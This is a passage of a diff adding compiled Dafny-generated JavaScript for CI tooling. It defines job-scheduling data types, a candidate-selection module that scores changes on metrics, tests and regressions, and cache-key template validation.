+        return other.$tag === 0 && _dafny.areEqual(this.duration, other.duration) && _dafny.areEqual(this.cost, other.cost) && _dafny.areEqual(this.demand, other.demand);
+      } else {
+        return false;
+      }
+    }
+    static Default() {
+      return CiPolicy.Mode.create_Mode(_dafny.ZERO, _dafny.ZERO, _dafny.ZERO);
+    }
+    static Rtd() {
+      return class {
+        static get Default() {
+          return Mode.Default();
+        }
+      };
+    }
+  };
+  $module.Job = class Job {
+    constructor(tag) {
+      this.$tag = tag;
+    }
+    static create_Job(modes, needs) {
+      let $dt = new Job(0);
+      $dt.modes = modes;
+      $dt.needs = needs;
+      return $dt;
+    }
+    get is_Job() {
+      return this.$tag === 0;
+    }
+    get dtor_modes() {
+      return this.modes;
+    }
+    get dtor_needs() {
+      return this.needs;
+    }
+    toString() {
+      if (this.$tag === 0) {
+        return "CiPolicy.Job.Job(" + _dafny.toString(this.modes) + ", " + _dafny.toString(this.needs) + ")";
+      } else {
+        return "<unexpected>";
+      }
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      } else if (this.$tag === 0) {
+        return other.$tag === 0 && _dafny.areEqual(this.modes, other.modes) && _dafny.areEqual(this.needs, other.needs);
+      } else {
+        return false;
+      }
+    }
+    static Default() {
+      return CiPolicy.Job.create_Job(_dafny.Seq.of(), _dafny.Seq.of());
+    }
+    static Rtd() {
+      return class {
+        static get Default() {
+          return Job.Default();
+        }
+      };
+    }
+  };
+  $module.Environment = class Environment {
+    constructor(tag) {
+      this.$tag = tag;
+    }
+    static create_Environment(jobs, horizon, capacity, costLimit) {
+      let $dt = new Environment(0);
+      $dt.jobs = jobs;
+      $dt.horizon = horizon;
+      $dt.capacity = capacity;
+      $dt.costLimit = costLimit;
+      return $dt;
+    }
+    get is_Environment() {
+      return this.$tag === 0;
+    }
+    get dtor_jobs() {
+      return this.jobs;
+    }
+    get dtor_horizon() {
+      return this.horizon;
+    }
+    get dtor_capacity() {
+      return this.capacity;
+    }
+    get dtor_costLimit() {
+      return this.costLimit;
+    }
+    toString() {
+      if (this.$tag === 0) {
+        return "CiPolicy.Environment.Environment(" + _dafny.toString(this.jobs) + ", " + _dafny.toString(this.horizon) + ", " + _dafny.toString(this.capacity) + ", " + _dafny.toString(this.costLimit) + ")";
+      } else {
+        return "<unexpected>";
+      }
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      } else if (this.$tag === 0) {
+        return other.$tag === 0 && _dafny.areEqual(this.jobs, other.jobs) && _dafny.areEqual(this.horizon, other.horizon) && _dafny.areEqual(this.capacity, other.capacity) && _dafny.areEqual(this.costLimit, other.costLimit);
+      } else {
+        return false;
+      }
+    }
+    static Default() {
+      return CiPolicy.Environment.create_Environment(_dafny.Seq.of(), _dafny.ZERO, _dafny.ZERO, _dafny.ZERO);
+    }
+    static Rtd() {
+      return class {
+        static get Default() {
+          return Environment.Default();
+        }
+      };
+    }
+  };
+  $module.Placement = class Placement {
+    constructor(tag) {
+      this.$tag = tag;
+    }
+    static create_Placement(mode, start) {
+      let $dt = new Placement(0);
+      $dt.mode = mode;
+      $dt.start = start;
+      return $dt;
+    }
+    get is_Placement() {
+      return this.$tag === 0;
+    }
+    get dtor_mode() {
+      return this.mode;
+    }
+    get dtor_start() {
+      return this.start;
+    }
+    toString() {
+      if (this.$tag === 0) {
+        return "CiPolicy.Placement.Placement(" + _dafny.toString(this.mode) + ", " + _dafny.toString(this.start) + ")";
+      } else {
+        return "<unexpected>";
+      }
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      } else if (this.$tag === 0) {
+        return other.$tag === 0 && _dafny.areEqual(this.mode, other.mode) && _dafny.areEqual(this.start, other.start);
+      } else {
+        return false;
+      }
+    }
+    static Default() {
+      return CiPolicy.Placement.create_Placement(_dafny.ZERO, _dafny.ZERO);
+    }
+    static Rtd() {
+      return class {
+        static get Default() {
+          return Placement.Default();
+        }
+      };
+    }
+  };
+  $module.Objective = class Objective {
+    constructor(tag) {
+      this.$tag = tag;
+    }
+    static create_Objective(makespan, cost) {
+      let $dt = new Objective(0);
+      $dt.makespan = makespan;
+      $dt.cost = cost;
+      return $dt;
+    }
+    get is_Objective() {
+      return this.$tag === 0;
+    }
+    get dtor_makespan() {
+      return this.makespan;
+    }
+    get dtor_cost() {
+      return this.cost;
+    }
+    toString() {
+      if (this.$tag === 0) {
+        return "CiPolicy.Objective.Objective(" + _dafny.toString(this.makespan) + ", " + _dafny.toString(this.cost) + ")";
+      } else {
+        return "<unexpected>";
+      }
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      } else if (this.$tag === 0) {
+        return other.$tag === 0 && _dafny.areEqual(this.makespan, other.makespan) && _dafny.areEqual(this.cost, other.cost);
+      } else {
+        return false;
+      }
+    }
+    static Default() {
+      return CiPolicy.Objective.create_Objective(_dafny.ZERO, _dafny.ZERO);
+    }
+    static Rtd() {
+      return class {
+        static get Default() {
+          return Objective.Default();
+        }
+      };
+    }
+  };
+  $module.Result = class Result {
+    constructor(tag) {
+      this.$tag = tag;
+    }
+    static create_Invalid() {
+      let $dt = new Result(0);
+      return $dt;
+    }
+    static create_Exhausted(required2) {
+      let $dt = new Result(1);
+      $dt.required = required2;
+      return $dt;
+    }
+    static create_Infeasible(examined) {
+      let $dt = new Result(2);
+      $dt.examined = examined;
+      return $dt;
+    }
+    static create_Optimal(examined, rank2, policy2, objective) {
+      let $dt = new Result(3);
+      $dt.examined = examined;
+      $dt.rank = rank2;
+      $dt.policy = policy2;
+      $dt.objective = objective;
+      return $dt;
+    }
+    get is_Invalid() {
+      return this.$tag === 0;
+    }
+    get is_Exhausted() {
+      return this.$tag === 1;
+    }
+    get is_Infeasible() {
+      return this.$tag === 2;
+    }
+    get is_Optimal() {
+      return this.$tag === 3;
+    }
+    get dtor_required() {
+      return this.required;
+    }
+    get dtor_examined() {
+      return this.examined;
+    }
+    get dtor_rank() {
+      return this.rank;
+    }
+    get dtor_policy() {
+      return this.policy;
+    }
+    get dtor_objective() {
+      return this.objective;
+    }
+    toString() {
+      if (this.$tag === 0) {
+        return "CiPolicy.Result.Invalid";
+      } else if (this.$tag === 1) {
+        return "CiPolicy.Result.Exhausted(" + _dafny.toString(this.required) + ")";
+      } else if (this.$tag === 2) {
+        return "CiPolicy.Result.Infeasible(" + _dafny.toString(this.examined) + ")";
+      } else if (this.$tag === 3) {
+        return "CiPolicy.Result.Optimal(" + _dafny.toString(this.examined) + ", " + _dafny.toString(this.rank) + ", " + _dafny.toString(this.policy) + ", " + _dafny.toString(this.objective) + ")";
+      } else {
+        return "<unexpected>";
+      }
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      } else if (this.$tag === 0) {
+        return other.$tag === 0;
+      } else if (this.$tag === 1) {
+        return other.$tag === 1 && _dafny.areEqual(this.required, other.required);
+      } else if (this.$tag === 2) {
+        return other.$tag === 2 && _dafny.areEqual(this.examined, other.examined);
+      } else if (this.$tag === 3) {
+        return other.$tag === 3 && _dafny.areEqual(this.examined, other.examined) && _dafny.areEqual(this.rank, other.rank) && _dafny.areEqual(this.policy, other.policy) && _dafny.areEqual(this.objective, other.objective);
+      } else {
+        return false;
+      }
+    }
+    static Default() {
+      return CiPolicy.Result.create_Invalid();
+    }
+    static Rtd() {
+      return class {
+        static get Default() {
+          return Result.Default();
+        }
+      };
+    }
+  };
+  return $module;
+})();
+var Policy = (function() {
+  let $module = {};
+  $module.__default = class __default {
+    constructor() {
+      this._tname = "Policy._default";
+    }
+    _parentTraits() {
+      return [];
+    }
+    static Resolve(updates) {
+      let severity3 = _dafny.ZERO;
+      severity3 = _dafny.ZERO;
+      let _0_i;
+      _0_i = _dafny.ZERO;
+      while (_0_i.isLessThan(new BigNumber(updates.length))) {
+        if (!updates[_0_i].isEqualTo(new BigNumber(-1))) {
+          severity3 = updates[_0_i];
+        }
+        _0_i = _0_i.plus(_dafny.ONE);
+      }
+      return severity3;
+    }
+  };
+  return $module;
+})();
+var Selection = (function() {
+  let $module = {};
+  $module.__default = class __default {
+    constructor() {
+      this._tname = "Selection._default";
+    }
+    _parentTraits() {
+      return [];
+    }
+    static ValidMetric(m) {
+      return _dafny.ZERO.minus(Selection.__default.Scale).isLessThanOrEqualTo(m.dtor_delta) && m.dtor_delta.isLessThanOrEqualTo(Selection.__default.Scale) && _dafny.ZERO.isLessThanOrEqualTo(m.dtor_weight) && (new BigNumber(-1).isLessThanOrEqualTo(m.dtor_regressionLimit) && m.dtor_regressionLimit.isLessThanOrEqualTo(Selection.__default.Scale));
+    }
+    static Weight(ms) {
+      let _0___accumulator = _dafny.ZERO;
+      TAIL_CALL_START: while (true) {
+        if (new BigNumber(ms.length).isEqualTo(_dafny.ZERO)) {
+          return _dafny.ZERO.plus(_0___accumulator);
+        } else {
+          _0___accumulator = _0___accumulator.plus(ms[_dafny.ZERO].dtor_weight);
+          let _in0 = ms.slice(_dafny.ONE);
+          ms = _in0;
+          continue TAIL_CALL_START;
+        }
+      }
+    }
+    static Weighted(ms) {
+      let _0___accumulator = _dafny.ZERO;
+      TAIL_CALL_START: while (true) {
+        if (new BigNumber(ms.length).isEqualTo(_dafny.ZERO)) {
+          return _dafny.ZERO.plus(_0___accumulator);
+        } else {
+          _0___accumulator = _0___accumulator.plus(ms[_dafny.ZERO].dtor_weight.multipliedBy(ms[_dafny.ZERO].dtor_delta));
+          let _in0 = ms.slice(_dafny.ONE);
+          ms = _in0;
+          continue TAIL_CALL_START;
+        }
+      }
+    }
+    static Valid(c, minimum, influence) {
+      return !c.dtor_invalid && (_dafny.ZERO.isLessThanOrEqualTo(minimum) && minimum.isLessThanOrEqualTo(Selection.__default.Scale)) && (_dafny.ZERO.isLessThanOrEqualTo(influence) && influence.isLessThanOrEqualTo(_dafny.EuclideanDivision(Selection.__default.Scale, new BigNumber(2)))) && (new BigNumber(-1).isLessThanOrEqualTo(c.dtor_tests) && c.dtor_tests.isLessThanOrEqualTo(_dafny.ONE)) && (new BigNumber(-1).isLessThanOrEqualTo(c.dtor_controlTests) && c.dtor_controlTests.isLessThanOrEqualTo(_dafny.ONE)) && (new BigNumber(-1).isLessThanOrEqualTo(c.dtor_judge) && c.dtor_judge.isLessThanOrEqualTo(Selection.__default.Scale)) && _dafny.ZERO.isLessThan(new BigNumber(c.dtor_metrics.length)) && _dafny.Quantifier(c.dtor_metrics.UniqueElements, true, function(_forall_var_0) {
+        let _0_m = _forall_var_0;
+        return !_dafny.Seq.contains(c.dtor_metrics, _0_m) || Selection.__default.ValidMetric(_0_m);
+      }) && _dafny.ZERO.isLessThan(Selection.__default.Weight(c.dtor_metrics));
+    }
+    static Round(numerator, denominator) {
+      return _dafny.EuclideanDivision(new BigNumber(2).multipliedBy(numerator).plus(denominator), new BigNumber(2).multipliedBy(denominator));
+    }
+    static Mean(ms) {
+      return Selection.__default.Round(Selection.__default.Weighted(ms), Selection.__default.Weight(ms));
+    }
+    static Rank(score, judge, influence) {
+      if (judge.isEqualTo(new BigNumber(-1))) {
+        return score;
+      } else {
+        let _0_numerator = Selection.__default.Scale.minus(influence).multipliedBy(score).plus(influence.multipliedBy(new BigNumber(2).multipliedBy(judge).minus(Selection.__default.Scale)));
+        return Selection.__default.Round(_0_numerator, Selection.__default.Scale);
+      }
+    }
+    static Regression(ms) {
+      return _dafny.Quantifier(ms.UniqueElements, false, function(_exists_var_0) {
+        let _0_m = _exists_var_0;
+        return _dafny.Seq.contains(ms, _0_m) && (_0_m.dtor_measured && _dafny.ZERO.isLessThanOrEqualTo(_0_m.dtor_regressionLimit) && _0_m.dtor_delta.isLessThan(_dafny.ZERO.minus(_0_m.dtor_regressionLimit)));
+      });
+    }
+    static HardFailure(c, minimum, influence) {
+      return !Selection.__default.Valid(c, minimum, influence) || c.dtor_tests.isEqualTo(_dafny.ZERO) || c.dtor_controlTests.isEqualTo(_dafny.ZERO) || c.dtor_armError || c.dtor_controlError || c.dtor_protectedPath || Selection.__default.Regression(c.dtor_metrics);
+    }
+    static Pending(c) {
+      return c.dtor_tests.isEqualTo(new BigNumber(-1)) || c.dtor_controlTests.isEqualTo(new BigNumber(-1)) || _dafny.Quantifier(c.dtor_metrics.UniqueElements, false, function(_exists_var_0) {
+        let _0_m = _exists_var_0;
+        return _dafny.Seq.contains(c.dtor_metrics, _0_m) && !_0_m.dtor_measured;
+      });
+    }
+    static Evaluate(c, minimum, influence) {
+      let _0_valid = Selection.__default.Valid(c, minimum, influence);
+      let _1_score = _0_valid ? Selection.__default.Mean(c.dtor_metrics) : _dafny.ZERO;
+      let _2_rank = _0_valid ? Selection.__default.Rank(_1_score, c.dtor_judge, influence) : _dafny.ZERO;
+      let _3_failed = Selection.__default.HardFailure(c, minimum, influence);
+      let _4_pending = Selection.__default.Pending(c);
+      return Selection.Score.create_Score(_1_score, _2_rank, _3_failed, _4_pending, !_3_failed && !_4_pending && minimum.isLessThanOrEqualTo(_1_score));
+    }
+    static Preferred(a, ai, b, bi) {
+      return b.dtor_rank.isLessThan(a.dtor_rank) || a.dtor_rank.isEqualTo(b.dtor_rank) && (b.dtor_deterministic.isLessThan(a.dtor_deterministic) || a.dtor_deterministic.isEqualTo(b.dtor_deterministic) && ai.isLessThanOrEqualTo(bi));
+    }
+    static Select(cs, minimum, influence) {
+      let winner = _dafny.ZERO;
+      let unfinished = false;
+      winner = new BigNumber(-1);
+      unfinished = false;
+      let _0_i;
+      _0_i = _dafny.ZERO;
+      while (_0_i.isLessThan(new BigNumber(cs.length))) {
+        let _1_next;
+        _1_next = Selection.__default.Evaluate(cs[_0_i], minimum, influence);
+        unfinished = unfinished || _1_next.dtor_pending && !_1_next.dtor_failed;
+        if (_1_next.dtor_eligible) {
+          if (winner.isEqualTo(new BigNumber(-1))) {
+            winner = _0_i;
+          } else if (Selection.__default.Preferred(_1_next, _0_i, Selection.__default.Evaluate(cs[winner], minimum, influence), winner)) {
+            winner = _0_i;
+          } else {
+          }
+        }
+        _0_i = _0_i.plus(_dafny.ONE);
+      }
+      return [winner, unfinished];
+    }
+    static Reduce(cs, minimum, influence, running, expired) {
+      let action = Selection.Action.Default();
+      if (!running) {
+        action = Selection.Action.create_Skip();
+        return action;
+      }
+      let _0_winner;
+      let _1_unfinished;
+      let _out0;
+      let _out1;
+      let _outcollector0 = Selection.__default.Select(cs, minimum, influence);
+      _out0 = _outcollector0[0];
+      _out1 = _outcollector0[1];
+      _0_winner = _out0;
+      _1_unfinished = _out1;
+      if (_dafny.ZERO.isLessThanOrEqualTo(_0_winner) && (!_1_unfinished || expired)) {
+        action = Selection.Action.create_Promote(_0_winner);
+      } else if (expired) {
+        action = Selection.Action.create_Expire();
+      } else if (!_1_unfinished) {
+        action = Selection.Action.create_Reject();
+      } else {
+        action = Selection.Action.create_Wait();
+      }
+      return action;
+    }
+    static get Scale() {
+      return new BigNumber(1e4);
+    }
+  };
+  $module.Metric = class Metric {
+    constructor(tag) {
+      this.$tag = tag;
+    }
+    static create_Metric(delta, weight, measured, regressionLimit) {
+      let $dt = new Metric(0);
+      $dt.delta = delta;
+      $dt.weight = weight;
+      $dt.measured = measured;
+      $dt.regressionLimit = regressionLimit;
+      return $dt;
+    }
+    get is_Metric() {
+      return this.$tag === 0;
+    }
+    get dtor_delta() {
+      return this.delta;
+    }
+    get dtor_weight() {
+      return this.weight;
+    }
+    get dtor_measured() {
+      return this.measured;
+    }
+    get dtor_regressionLimit() {
+      return this.regressionLimit;
+    }
+    toString() {
+      if (this.$tag === 0) {
+        return "Selection.Metric.Metric(" + _dafny.toString(this.delta) + ", " + _dafny.toString(this.weight) + ", " + _dafny.toString(this.measured) + ", " + _dafny.toString(this.regressionLimit) + ")";
+      } else {
+        return "<unexpected>";
+      }
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      } else if (this.$tag === 0) {
+        return other.$tag === 0 && _dafny.areEqual(this.delta, other.delta) && _dafny.areEqual(this.weight, other.weight) && this.measured === other.measured && _dafny.areEqual(this.regressionLimit, other.regressionLimit);
+      } else {
+        return false;
+      }
+    }
+    static Default() {
+      return Selection.Metric.create_Metric(_dafny.ZERO, _dafny.ZERO, false, _dafny.ZERO);
+    }
+    static Rtd() {
+      return class {
+        static get Default() {
+          return Metric.Default();
+        }
+      };
+    }
+  };
+  $module.Candidate = class Candidate {
+    constructor(tag) {
+      this.$tag = tag;
+    }
+    static create_Candidate(metrics, tests, controlTests, armError, controlError, protectedPath, invalid, judge) {
+      let $dt = new Candidate(0);
+      $dt.metrics = metrics;
+      $dt.tests = tests;
+      $dt.controlTests = controlTests;
+      $dt.armError = armError;
+      $dt.controlError = controlError;
+      $dt.protectedPath = protectedPath;
+      $dt.invalid = invalid;
+      $dt.judge = judge;
+      return $dt;
+    }
+    get is_Candidate() {
+      return this.$tag === 0;
+    }
+    get dtor_metrics() {
+      return this.metrics;
+    }
+    get dtor_tests() {
+      return this.tests;
+    }
+    get dtor_controlTests() {
+      return this.controlTests;
+    }
+    get dtor_armError() {
+      return this.armError;
+    }
+    get dtor_controlError() {
+      return this.controlError;
+    }
+    get dtor_protectedPath() {
+      return this.protectedPath;
+    }
+    get dtor_invalid() {
+      return this.invalid;
+    }
+    get dtor_judge() {
+      return this.judge;
+    }
+    toString() {
+      if (this.$tag === 0) {
+        return "Selection.Candidate.Candidate(" + _dafny.toString(this.metrics) + ", " + _dafny.toString(this.tests) + ", " + _dafny.toString(this.controlTests) + ", " + _dafny.toString(this.armError) + ", " + _dafny.toString(this.controlError) + ", " + _dafny.toString(this.protectedPath) + ", " + _dafny.toString(this.invalid) + ", " + _dafny.toString(this.judge) + ")";
+      } else {
+        return "<unexpected>";
+      }
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      } else if (this.$tag === 0) {
+        return other.$tag === 0 && _dafny.areEqual(this.metrics, other.metrics) && _dafny.areEqual(this.tests, other.tests) && _dafny.areEqual(this.controlTests, other.controlTests) && this.armError === other.armError && this.controlError === other.controlError && this.protectedPath === other.protectedPath && this.invalid === other.invalid && _dafny.areEqual(this.judge, other.judge);
+      } else {
+        return false;
+      }
+    }
+    static Default() {
+      return Selection.Candidate.create_Candidate(_dafny.Seq.of(), _dafny.ZERO, _dafny.ZERO, false, false, false, false, _dafny.ZERO);
+    }
+    static Rtd() {
+      return class {
+        static get Default() {
+          return Candidate.Default();
+        }
+      };
+    }
+  };
+  $module.Score = class Score {
+    constructor(tag) {
+      this.$tag = tag;
+    }
+    static create_Score(deterministic, rank2, failed, pending, eligible2) {
+      let $dt = new Score(0);
+      $dt.deterministic = deterministic;
+      $dt.rank = rank2;
+      $dt.failed = failed;
+      $dt.pending = pending;
+      $dt.eligible = eligible2;
+      return $dt;
+    }
+    get is_Score() {
+      return this.$tag === 0;
+    }
+    get dtor_deterministic() {
+      return this.deterministic;
+    }
+    get dtor_rank() {
+      return this.rank;
+    }
+    get dtor_failed() {
+      return this.failed;
+    }
+    get dtor_pending() {
+      return this.pending;
+    }
+    get dtor_eligible() {
+      return this.eligible;
+    }
+    toString() {
+      if (this.$tag === 0) {
+        return "Selection.Score.Score(" + _dafny.toString(this.deterministic) + ", " + _dafny.toString(this.rank) + ", " + _dafny.toString(this.failed) + ", " + _dafny.toString(this.pending) + ", " + _dafny.toString(this.eligible) + ")";
+      } else {
+        return "<unexpected>";
+      }
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      } else if (this.$tag === 0) {
+        return other.$tag === 0 && _dafny.areEqual(this.deterministic, other.deterministic) && _dafny.areEqual(this.rank, other.rank) && this.failed === other.failed && this.pending === other.pending && this.eligible === other.eligible;
+      } else {
+        return false;
+      }
+    }
+    static Default() {
+      return Selection.Score.create_Score(_dafny.ZERO, _dafny.ZERO, false, false, false);
+    }
+    static Rtd() {
+      return class {
+        static get Default() {
+          return Score.Default();
+        }
+      };
+    }
+  };
+  $module.Action = class Action {
+    constructor(tag) {
+      this.$tag = tag;
+    }
+    static create_Skip() {
+      let $dt = new Action(0);
+      return $dt;
+    }
+    static create_Wait() {
+      let $dt = new Action(1);
+      return $dt;
+    }
+    static create_Promote(index) {
+      let $dt = new Action(2);
+      $dt.index = index;
+      return $dt;
+    }
+    static create_Reject() {
+      let $dt = new Action(3);
+      return $dt;
+    }
+    static create_Expire() {
+      let $dt = new Action(4);
+      return $dt;
+    }
+    get is_Skip() {
+      return this.$tag === 0;
+    }
+    get is_Wait() {
+      return this.$tag === 1;
+    }
+    get is_Promote() {
+      return this.$tag === 2;
+    }
+    get is_Reject() {
+      return this.$tag === 3;
+    }
+    get is_Expire() {
+      return this.$tag === 4;
+    }
+    get dtor_index() {
+      return this.index;
+    }
+    toString() {
+      if (this.$tag === 0) {
+        return "Selection.Action.Skip";
+      } else if (this.$tag === 1) {
+        return "Selection.Action.Wait";
+      } else if (this.$tag === 2) {
+        return "Selection.Action.Promote(" + _dafny.toString(this.index) + ")";
+      } else if (this.$tag === 3) {
+        return "Selection.Action.Reject";
+      } else if (this.$tag === 4) {
+        return "Selection.Action.Expire";
+      } else {
+        return "<unexpected>";
+      }
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      } else if (this.$tag === 0) {
+        return other.$tag === 0;
+      } else if (this.$tag === 1) {
+        return other.$tag === 1;
+      } else if (this.$tag === 2) {
+        return other.$tag === 2 && _dafny.areEqual(this.index, other.index);
+      } else if (this.$tag === 3) {
+        return other.$tag === 3;
+      } else if (this.$tag === 4) {
+        return other.$tag === 4;
+      } else {
+        return false;
+      }
+    }
+    static Default() {
+      return Selection.Action.create_Skip();
+    }
+    static Rtd() {
+      return class {
+        static get Default() {
+          return Action.Default();
+        }
+      };
+    }
+  };
+  return $module;
+})();
+var CacheKey = (function() {
+  let $module = {};
+  $module.__default = class __default {
+    constructor() {
+      this._tname = "CacheKey._default";
+    }
+    _parentTraits() {
+      return [];
+    }
+    static Val(c, r) {
+      let _source0 = c;
+      {
+        if (_source0.is_Lit) {
+          let _0_s = _source0.s;
+          return _0_s;
+        }
+      }
+      {
+        if (_source0.is_RunnerOs) {
+          return r.dtor_os;
+        }
+      }
+      {
+        if (_source0.is_HashFiles) {
+          let _1_id = _source0.id;
+          if (r.dtor_files.contains(_1_id)) {
+            return r.dtor_files.get(_1_id);
+          } else {
+            return _dafny.Seq.UnicodeFromString("");
+          }
+        }
+      }
+      {
+        let _2_v = _source0.c;
+        if (r.dtor_ctx.contains(_2_v)) {
+          return r.dtor_ctx.get(_2_v);
+        } else {
+          return _dafny.Seq.UnicodeFromString("");
+        }
+      }
+    }
+    static Render(t, r) {
+      let _0___accumulator = _dafny.Seq.of();
+      TAIL_CALL_START: while (true) {
+        if (new BigNumber(t.length).isEqualTo(_dafny.ZERO)) {
+          return _dafny.Seq.Concat(_0___accumulator, _dafny.Seq.UnicodeFromString(""));
+        } else {
+          _0___accumulator = _dafny.Seq.Concat(_0___accumulator, CacheKey.__default.Val(t[_dafny.ZERO], r));
+          let _in0 = t.slice(_dafny.ONE);
+          let _in1 = r;
+          t = _in0;
+          r = _in1;
+          continue TAIL_CALL_START;
+        }
+      }
+    }
+    static ClassOf(c) {
+      let _source0 = c;
+      {
+        if (_source0.is_Lit) {
+          return CacheKey.Cls.create_Any();
+        }
+      }
+      {
+        if (_source0.is_RunnerOs) {
+          return CacheKey.Cls.create_Letters();
+        }
+      }
+      {
+        if (_source0.is_HashFiles) {
+          return CacheKey.Cls.create_Hex();
+        }
+      }
+      {
+        let _0_v = _source0.c;
+        if (_dafny.areEqual(_0_v, CacheKey.CtxVar.create_Sha())) {
+          return CacheKey.Cls.create_Hex();
+        } else if (_dafny.areEqual(_0_v, CacheKey.CtxVar.create_RunId()) || _dafny.areEqual(_0_v, CacheKey.CtxVar.create_RunNumber()) || _dafny.areEqual(_0_v, CacheKey.CtxVar.create_RunAttempt())) {
+          return CacheKey.Cls.create_Digits();
+        } else {
+          return CacheKey.Cls.create_Any();
+        }
+      }
+    }
+    static FixedLen(c) {
+      if (_dafny.areEqual(c, CacheKey.Comp.create_Ctx(CacheKey.CtxVar.create_Sha()))) {
+        return new BigNumber(40);
+      } else {
+        return _dafny.ZERO;
+      }
+    }
+    static InClass(k, ch) {
+      let _source0 = k;
+      {
+        if (_source0.is_Letters) {
+          return new _dafny.CodePoint("a".codePointAt(0)).isLessThanOrEqual(ch) && ch.isLessThanOrEqual(new _dafny.CodePoint("z".codePointAt(0))) || new _dafny.CodePoint("A".codePointAt(0)).isLessThanOrEqual(ch) && ch.isLessThanOrEqual(new _dafny.CodePoint("Z".codePointAt(0)));
+        }
+      }
+      {
+        if (_source0.is_Hex) {
+          return new _dafny.CodePoint("0".codePointAt(0)).isLessThanOrEqual(ch) && ch.isLessThanOrEqual(new _dafny.CodePoint("9".codePointAt(0))) || new _dafny.CodePoint("a".codePointAt(0)).isLessThanOrEqual(ch) && ch.isLessThanOrEqual(new _dafny.CodePoint("f".codePointAt(0)));
+        }
+      }
+      {
+        if (_source0.is_Digits) {
+          return new _dafny.CodePoint("0".codePointAt(0)).isLessThanOrEqual(ch) && ch.isLessThanOrEqual(new _dafny.CodePoint("9".codePointAt(0)));
+        }
+      }
+      {
+        return true;
+      }
+    }
+    static AllIn(k, s) {
+      return _dafny.Quantifier(_dafny.IntegerRange(_dafny.ZERO, new BigNumber(s.length)), true, function(_forall_var_0) {
+        let _0_i = _forall_var_0;
+        return !(_dafny.ZERO.isLessThanOrEqualTo(_0_i) && _0_i.isLessThan(new BigNumber(s.length))) || CacheKey.__default.InClass(k, s[_0_i]);
+      });
+    }
+    static InDomain(c, v) {
+      let _source0 = c;
+      {
+        if (_source0.is_Lit) {
+          let _0_s = _source0.s;
+          return _dafny.areEqual(v, _0_s);
+        }
+      }
+      {
+        if (_source0.is_RunnerOs) {
+          return _dafny.areEqual(v, _dafny.Seq.UnicodeFromString("Linux")) || _dafny.areEqual(v, _dafny.Seq.UnicodeFromString("Windows")) || _dafny.areEqual(v, _dafny.Seq.UnicodeFromString("macOS"));
+        }
+      }
+      {
+        if (_source0.is_HashFiles) {
+          return (new BigNumber(v.length).isEqualTo(_dafny.ZERO) || new BigNumber(v.length).isEqualTo(new BigNumber(64))) && CacheKey.__default.AllIn(CacheKey.Cls.create_Hex(), v);
+        }
+      }
+      {
+        let _1_x = _source0.c;
+        if (_dafny.areEqual(_1_x, CacheKey.CtxVar.create_Sha())) {
+          return new BigNumber(v.length).isEqualTo(new BigNumber(40)) && CacheKey.__default.AllIn(CacheKey.Cls.create_Hex(), v);
+        } else if (_dafny.areEqual(_1_x, CacheKey.CtxVar.create_RunId()) || _dafny.areEqual(_1_x, CacheKey.CtxVar.create_RunNumber()) || _dafny.areEqual(_1_x, CacheKey.CtxVar.create_RunAttempt())) {
+          return _dafny.ZERO.isLessThan(new BigNumber(v.length)) && CacheKey.__default.AllIn(CacheKey.Cls.create_Digits(), v);
+        } else {
+          return true;
+        }
+      }
+    }
+    static WF(t, r) {
+      return _dafny.Quantifier(_dafny.IntegerRange(_dafny.ZERO, new BigNumber(t.length)), true, function(_forall_var_0) {
+        let _0_i = _forall_var_0;
+        return !(_dafny.ZERO.isLessThanOrEqualTo(_0_i) && _0_i.isLessThan(new BigNumber(t.length))) || CacheKey.__default.InDomain(t[_0_i], CacheKey.__default.Val(t[_0_i], r));
+      });
+    }
+    static SepHead(t) {
+      return t[_dafny.ZERO].is_Lit || _dafny.ZERO.isLessThan(CacheKey.__default.FixedLen(t[_dafny.ZERO])) || new BigNumber(t.length).isEqualTo(_dafny.ONE) || t[_dafny.ONE].is_Lit && _dafny.ZERO.isLessThan(new BigNumber(t[_dafny.ONE].dtor_s.length)) && !_dafny.areEqual(CacheKey.__default.ClassOf(t[_dafny.ZERO]), CacheKey.Cls.create_Any()) && !CacheKey.__default.InClass(CacheKey.__default.ClassOf(t[_dafny.ZERO]), t[_dafny.ONE].dtor_s[_dafny.ZERO]);
+    }
+    static Separated(t) {
+      return new BigNumber(t.length).isEqualTo(_dafny.ZERO) || CacheKey.__default.SepHead(t) && CacheKey.__default.Separated(t.slice(_dafny.ONE));
+    }
+    static CompOf(d) {
+      let _source0 = d;
+      {
+        if (_source0.is_DOs) {
+          return CacheKey.Comp.create_RunnerOs();
+        }
+      }
+      {
+        if (_source0.is_DFiles) {
+          let _0_id = _source0.id;
+          return CacheKey.Comp.create_HashFiles(_0_id);
+        }
+      }
+      {
+        let _1_c = _source0.c;
+        return CacheKey.Comp.create_Ctx(_1_c);
+      }
+    }
+    static DepsEq(deps, r1, r2) {
+      return _dafny.Quantifier(deps.Elements, true, function(_forall_var_0) {
+        let _0_d = _forall_var_0;
+        return !deps.contains(_0_d) || _dafny.areEqual(CacheKey.__default.Val(CacheKey.__default.CompOf(_0_d), r1), CacheKey.__default.Val(CacheKey.__default.CompOf(_0_d), r2));
+      });
+    }
+    static KeyEq(t, r1, r2) {
+      return _dafny.areEqual(CacheKey.__default.Render(t, r1), CacheKey.__default.Render(t, r2));
+    }
+    static Covers(t, deps) {
+      return _dafny.Quantifier(deps.Elements, true, function(_forall_var_0) {
+        let _0_d = _forall_var_0;
+        return !deps.contains(_0_d) || _dafny.Seq.contains(t, CacheKey.__default.CompOf(_0_d));
+      });
+    }
+    static Determined(t, deps) {
+      return _dafny.Quantifier(_dafny.IntegerRange(_dafny.ZERO, new BigNumber(t.length)), true, function(_forall_var_0) {
+        let _0_i = _forall_var_0;
+        return !(_dafny.ZERO.isLessThanOrEqualTo(_0_i) && _0_i.isLessThan(new BigNumber(t.length))) || (t[_0_i].is_Lit || _dafny.Quantifier(deps.Elements, false, function(_exists_var_0) {
+          let _1_d = _exists_var_0;
+          return deps.contains(_1_d) && _dafny.areEqual(CacheKey.__default.CompOf(_1_d), t[_0_i]);
+        }));
+      });
+    }
+    static Norm(t) {
